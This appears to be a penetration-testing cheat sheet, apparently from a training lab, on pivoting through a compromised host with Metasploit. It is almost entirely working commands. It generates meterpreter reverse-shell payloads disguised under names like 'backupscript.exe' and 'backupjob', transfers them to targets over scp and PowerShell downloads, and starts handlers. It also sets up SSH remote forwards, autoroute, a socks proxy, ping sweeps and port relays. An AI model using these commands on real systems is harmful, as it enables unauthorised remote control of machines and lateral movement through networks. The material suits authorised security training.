
Create windows payload for rev shell
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

Create ubuntu payload for rev shell
```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```


Open metasploit and setup handler
```shell-session
msf6 > use exploit/multi/handler
```


Transferring files over ssh 
```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```


Starting python web server on pivot host to setup local transfer with powershell
```shell-session
python3 -m http.server 8123
```

Transferring file via powershell on pivot host
```powershell-session
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

SSH remote port forwarding on pivot host
```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

Ping sweep for host on subnet
```shell-session
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

Setting up msf socks proxy
```shell-session
use auxiliary/server/socks_proxy
```

Check if socks proxy if running
```shell-session
auxiliary(server/socks_proxy) > jobs
```


msf autoroute outside of meterpreter sessions
```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

msf autoroute within meterpreter session
```shell-session
run autoroute -s 172.16.5.0/23
```

list active routes
```shell-session
run autoroute -p
```

Creating tcp relay
```shell-session
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

view sessions
```shell-session
netstat -antp
```

Reverse port forward on pivot host rev shell
```shell-session
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

Setting up multi handler on from attack host
```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081
```
